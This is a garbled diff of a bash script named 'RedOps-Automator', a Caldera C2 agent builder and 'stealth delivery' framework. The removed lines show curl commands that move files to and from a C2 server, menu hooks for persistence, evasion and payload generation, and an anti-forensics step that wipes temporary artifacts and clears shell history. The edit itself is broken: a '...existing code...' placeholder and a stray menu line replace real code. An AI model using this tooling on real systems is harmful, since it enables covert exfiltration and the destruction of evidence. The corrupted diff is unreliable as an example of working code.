@@ -1,7 +1,7 @@
 #!/bin/bash
 # RedOps-Automator v3.0
 # Full Caldera Agent Builder & Stealth Delivery Framework
-# Author: Kdairatchi x GPT
+# Author: Kdairatchi
 
 function banner() {
     echo -e "${CYAN}"
@@ -1111,72 +1111,10 @@ function main_menu() {
                 read -p "Enter instructions JSON: " instructions
                 enhanced_execute_instructions "$instructions"
                 ;;
-            6) automated_deployment ;;
-            7) install_persistence ;;
-            8) multi_target_deployment ;;
-            9) automated_deployment ;;
-            10) apply_evasion_techniques ;;
-            11) generate_advanced_payloads ;;
-            12) 
-                echo "1. Upload file to C2"
-                echo "2. Download file from C2"
-                read -p "Choice: " file_choice
-                if [[ "$file_choice" == "1" ]]; then
-                    read -p "File to upload: " upload_file
-                    if [[ -f "$upload_file" ]]; then
-                        local server=$(jq -r '.server' "$AGENT_PROFILE")
-                        curl -s -X POST -F "file=@$upload_file" "$server/file/upload"
-                        log_action "SUCCESS" "File uploaded: $upload_file"
-                    fi
-                elif [[ "$file_choice" == "2" ]]; then
-                    read -p "File to download: " download_file
-                    local server=$(jq -r '.server' "$AGENT_PROFILE")
-                    curl -s -X POST -H "file:$download_file" "$server/file/download" > "$download_file"
-                    log_action "SUCCESS" "File downloaded: $download_file"
-                fi
-                ;;
-            13) 
-                if [[ -f "$AGENT_PROFILE" ]]; then
-                    echo -e "${GREEN}Agent Status:${NC}"
-                    echo "PAW ID: $(jq -r '.paw' "$AGENT_PROFILE")"
-                    echo "Platform: $(jq -r '.platform' "$AGENT_PROFILE")/$(jq -r '.architecture' "$AGENT_PROFILE")"
-                    echo "Server: $(jq -r '.server' "$AGENT_PROFILE")"
-                    echo "Sleep: $(jq -r '.sleep' "$AGENT_PROFILE")s"
-                    echo "Created: $(jq -r '.created' "$AGENT_PROFILE")"
-                else
-                    echo -e "${RED}No agent profile found${NC}"
-                fi
-                ;;
-            14) 
-                log_action "INFO" "Cleaning artifacts..."
-                rm -rf /tmp/redops_* /tmp/agent_* /tmp/beacon_* /tmp/instructions.json 2>/dev/null
-                history -c
-                log_action "SUCCESS" "Artifacts cleaned"
-                ;;
-            15) 
-                if [[ "$DEBUG_MODE" == "true" ]]; then
-                    DEBUG_MODE=false
-                    log_action "INFO" "Debug mode disabled"
-                else
-                    DEBUG_MODE=true
-                    log_action "INFO" "Debug mode enabled"
-                fi
-                ;;
-            16) 
-                log_action "INFO" "Exiting RedOps-Automator..."
-                exit 0
-                ;;
-            *) 
-                log_action "ERROR" "Invalid choice. Please enter a number between 1 and 16."
-                ;;
-        esac
-        
-        echo -e "\n${YELLOW}Press Enter to continue...${NC}"
-        read
-    done
-}
+...existing code...
+# Replace legacy main_menu with unified show_main_menu
 
-# Script initialization
+        echo -e "5.  ${BLUE}Run ClearTracks (Paranoid Mode)${NC}"
 function init_redops() {
     banner
     check_dependencies
@@ -1193,50 +1131,8 @@ function init_redops() {
         log_action "WARNING" "Caldera C2 server not detected. Make sure it's running at $C2_HOST"
     fi
     
-    main_menu
+    show_main_menu
 }
-
-# Signal handlers
-trap 'log_action "WARNING" "Script interrupted by user"; exit 1' INT TERM
-
-# Start the enhanced RedOps-Automator
-init_redops
-EOF
-    
-    chmod +x "$redops_script"
-    log "SUCCESS" "RedOps-Automator Enhanced installed at $redops_script"
-}
-
-# Add RedOps to utility tools menu
-show_utility_tools_menu() {
-    while true; do
-        clear
-        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
-        echo -e "${GREEN}║                            UTILITY TOOLS                                    ║${NC}"
-        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
-        echo -e "1.  ${BLUE}Install DNS Changer Eye${NC}"
-        echo -e "2.  ${BLUE}Run DNS Changer Eye${NC}"
-        echo -e "3.  ${BLUE}Install ClearTracks Anti-Forensics${NC}"
-        echo -e "4.  ${BLUE}Run ClearTracks (Standard)${NC}"
-        echo -e "5.  ${BLUE}Run ClearTracks (Paranoid Mode)${NC}"
-        echo -e "6.  ${BLUE}Run ClearTracks (Selective Mode)${NC}"
-        echo -e "7.  ${BLUE}Install RedOps-Automator${NC}"
-        echo -e "8.  ${BLUE}Run RedOps-Automator${NC}"
-        echo -e "9.  ${BLUE}System Hardening Tools${NC}"
-        echo -e "10. ${BLUE}Network Tools${NC}"
-        echo -e "11. ${BLUE}Forensics Tools${NC}"
-        echo -e "12. ${BLUE}Advanced Payload Generator${NC}"
-        echo -e "13. ${BLUE}Back to Main Menu${NC}"
-        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
-        echo -n -e "${YELLOW}Enter your choice [1-13]: ${NC}"
-        read utility_choice
-        
-        case $utility_choice in
-            1) 
-                install_dns_changer
-                read -p "Press Enter to continue..."
-                ;;
-            2) 
                 if [[ -f "$TOOLS_DIR/dns_changer_eye.py" ]]; then
                     python3 "$TOOLS_DIR/dns_changer_eye.py"
                 else
